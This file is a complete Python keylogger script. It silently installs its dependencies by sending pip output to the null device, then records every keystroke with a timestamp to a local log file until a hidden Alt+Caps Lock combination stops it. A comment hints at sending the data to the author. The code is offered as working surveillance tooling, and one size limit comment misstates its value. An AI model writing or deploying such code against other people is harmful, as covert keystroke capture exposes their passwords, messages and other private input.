from pynput import keyboard
import time
import os
import subprocess
import sys

def install_requirements():
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "-r", "requirements.txt", "-q"], check=True)
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip", "-q"], check=True)
    except subprocess.CalledProcessError:
        #perhaps send an message to myself
        pass

oldStdout = sys.stdout
sys.stdout = open(os.devnull, "w")
install_requirements()
sys.stdout = oldStdout

FILENAME = "log.txt"
# maximum file size in MB to be read
MAXFILESIZE = 10 * 1024
REPEATTIME = 3600

pressedKeys = set()

def on_press(key):
    pressedKeys.add(key)

    if ((keyboard.Key.alt_l in pressedKeys or keyboard.Key.alt_r in pressedKeys) 
            and keyboard.Key.caps_lock in pressedKeys):
        return False
    
    # append if the file exists and smaller than specified size, otherwise overwrite it.
    if (os.path.isfile(FILENAME) and os.path.getsize(FILENAME) <= MAXFILESIZE):
        flag = "a"
    else:
        flag = "w"
    with open(FILENAME, flag) as f:
        lastKeyPressedTimeString = time.strftime("%Y-%m-%d %H:%M:%S")
        try:
            f.write(f"{key.char} pressed at {lastKeyPressedTimeString}\n")
        except AttributeError:
            # for non-ascii characters
            f.write(f"{key.name} pressed at {lastKeyPressedTimeString}\n")

def on_release(key):
    pressedKeys.remove(key)
    
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()